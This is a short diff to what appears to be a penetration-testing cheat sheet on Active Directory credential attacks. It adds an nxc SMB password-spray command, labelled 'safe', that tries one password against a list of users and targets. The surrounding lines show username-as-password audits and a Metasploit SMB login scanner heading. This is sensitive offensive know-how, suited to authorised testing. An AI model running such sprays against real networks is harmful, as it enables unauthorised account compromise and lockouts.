@@ -57,6 +57,11 @@ Invoke-DirectoryAuthAudit -Filter "(description=*admin*)" -Password 'x' -Force
 Invoke-DirectoryAuthAudit -UsernameAsPassword -OutFile valid.txt -Force -Quiet
 ```
 
+
+# #Using nxc Single password spray (safe)
+nxc smb targets.txt -u users.txt -p 'Winter2024!' -d DOMAIN --continue-on-success
+
+
 # Using the SMB Login Metasploit Auxiliary Scanner
 
 ```bash
